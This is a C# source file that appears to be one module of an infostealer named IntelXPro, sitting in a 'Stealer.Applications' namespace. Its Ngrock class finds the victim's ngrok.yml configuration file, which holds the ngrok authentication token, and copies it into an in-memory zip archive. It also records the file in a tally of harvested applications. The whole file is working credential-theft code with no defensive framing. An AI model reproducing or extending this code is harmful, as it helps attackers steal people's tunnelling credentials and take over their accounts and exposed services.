using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications
{
    internal class Ngrock : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ngrok", "ngrok.yml");
            if (File.Exists(text))
            {
                string text2 = "Ngrok\\ngrok.yml";
                Counter.CounterApplications counterApplications = new Counter.CounterApplications();
                counterApplications.Name = "Ngrok";
                zip.AddFile(text2, File.ReadAllBytes(text));
                counterApplications.Files.Add(text + " => " + text2);
                counterApplications.Files.Add(text2);
                counter.Applications.Add(counterApplications);
            }
        }
    }
}
